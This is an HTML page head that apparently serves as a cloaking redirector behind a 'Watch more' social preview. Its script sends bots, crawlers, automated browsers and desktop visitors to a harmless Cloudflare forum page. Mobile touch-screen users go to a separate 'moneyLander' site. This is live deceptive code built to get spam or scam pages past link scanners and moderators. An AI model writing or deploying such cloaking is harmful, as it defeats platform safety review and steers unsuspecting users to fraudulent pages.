<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- Updated Social Preview -->
    <meta property="og:title" content="Watch more">
    <meta property="og:description" content="Watch more">
    
    <meta property="og:image" content="https://i.postimg.cc/DzD235mH/Picsart-26-07-08-17-22-55-667.jpg">
    <meta property="og:image:width" content="500">
    <meta property="og:image:height" content="500">
    <meta property="og:type" content="website">

    <script>
        const safeRedirect = "https://community.cloudflare.com/t/how-to-bypass-cloudflare-country-challenge-captcha-on-some-urls/140948";
        const moneyLander = "https://ocher-dove-11v65rh.mystrikingly.com/";

        window.onload = function() {
            const ua = navigator.userAgent.toLowerCase();
            const isLargeScreen = window.innerWidth > 490;
            const isBot = /facebookexternalhit|facebot|metainspector|crawler|spider|bot/i.test(ua);
            const isAutomated = navigator.webdriver === true;
            const hasTouchSupport = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
            const isMobileOrTablet = /android|iphone|ipad|ipod/i.test(ua);
            const isDesktopPC = /windows|macintosh|linux/i.test(ua) && !/iphone|ipad|android/i.test(ua);

            if (isLargeScreen || isBot || isAutomated || !hasTouchSupport || isDesktopPC) {
                window.location.replace(safeRedirect);
            } else if (isMobileOrTablet && hasTouchSupport) {
                window.location.replace(moneyLander);
            } else {
                window.location.replace(safeRedirect);
            }
        };
    </script>
</head>
